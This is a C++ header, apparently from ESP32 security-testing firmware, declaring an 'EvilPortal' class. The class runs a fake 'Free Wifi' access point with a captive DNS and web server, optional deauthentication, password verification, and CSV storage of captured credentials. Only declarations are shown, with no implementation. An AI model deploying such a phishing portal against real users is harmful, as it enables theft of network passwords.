#ifndef __EVIL_PORTAL_H__
#define __EVIL_PORTAL_H__

#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <globals.h>
#include <WiFiType.h>

// A CaptiveRequestHandler used to be registered here. Its canHandle() was non-const
// while AsyncWebHandler's is const, so it never overrode, dispatch always took the
// base's false, and the handler was skipped for every request (ISSUE-32). Removed
// rather than const-corrected: webServer.onNotFound() already does the same routing
// and is the path that has always been live. Restoring the class without also dropping
// its beginResponseStream() would have activated a 1,460-byte-per-request leak.
class EvilPortal {
public:
    EvilPortal(
        String tssid = "", uint8_t channel = 6, bool deauth = false, bool verifyPwd = false,
        bool autoMode = false, bool backgroundMode = false, String templateFile = ""
    );
    ~EvilPortal();

    bool setup(void);
    // Returns false when softAP() failed, in which case no DNS server, no web server
    // and no wifiConnected flag are left behind (ISSUE-28).
    bool beginAP(void);
    void setupRoutes(void);
    void loop(void);
    void processRequests(void);
    void shutdown(void);
    bool isReady() { return _ready; }
    // softAPIP() cannot stand in for this: beginAP() calls softAPConfig() first,
    // which starts the netif and writes the address, so the IP reads back even
    // when the softAP() that follows fails.
    bool apOnAir() { return _apOnAir; }
    // False after restartWiFi() lost the AP, when DNS and HTTP were deliberately not
    // rebuilt. apOnAir() alone cannot express that: it says whether the radio came up,
    // not whether anything is serving on it.
    bool servicesUp() { return _servicesUp; }
    int getCredentialCount() { return totalCapturedCredentials; }

    bool hasCredentials();
    String getCapturedSSID();
    String getCapturedPassword();

    DNSServer &getDNSServer() { return *dnsServer; }
    AsyncWebServer &getWebServer() { return webServer; }
    String getApName() { return apName; }
    uint8_t getChannel() { return _channel; }
    bool isBackgroundMode() { return _backgroundMode; }

    bool hasRecentPageView();
    void recordPageView();

private:
    String apName = "Free Wifi";
    uint8_t _channel;
    bool _deauth;
    bool isDeauthHeld = false;
    bool _verifyPwd;
    bool _autoMode;
    bool _backgroundMode;
    String _autoTemplateFile;

    wifi_mode_t _originalWifiMode;
    bool _wifiWasConnected;

    AsyncWebServer webServer;

    DNSServer *dnsServer = nullptr;
    IPAddress apGateway;

    String outputFile = "default_creds.csv";

    String htmlPage;
    String htmlFileName;
    bool isDefaultHtml = true;
    FS *fsHtmlFile;

    String lastCred;
    int totalCapturedCredentials = 0;
    int previousTotalCapturedCredentials = -1;
    String capturedCredentialsHtml = "";
    bool verifyPass = false;
    bool _pendingWifiRestart = false;
    bool _ready = false;
    bool _apOnAir = false;
    // beginAP() was entered, so radio state exists to unwind; distinct from _apOnAir,
    // which says whether the AP actually came up.
    bool _beganAp = false;
    bool _servicesUp = false;
    bool _shutdownDone = false;

    unsigned long _lastPageViewTime = 0;

    void portalController(AsyncWebServerRequest *request);
    void credsController(AsyncWebServerRequest *request);

    bool verifyCreds(String &Ssid, String &Password);
    void restartWiFi(bool reset = true);
    void resetCapturedCredentials(void);
    void printDeauthStatus(void);
    void printLastCapturedCredential(void);
    void loadCustomHtml(void);
    bool loadCustomHtmlFromPath(const String &path);
    void loadDefaultHtml(void);
    void loadDefaultHtml_one(void);
    String wifiLoadPage(void);
    void saveToCSV(const String &csvLine, bool IsAPname = false);
    void drawScreen(void);

    String getHtmlTemplate(const String &body);
    String creds_GET(void);
    String ssid_GET(void);
    String ssid_POST(void);

    void apName_from_keyboard(void);
};

#endif
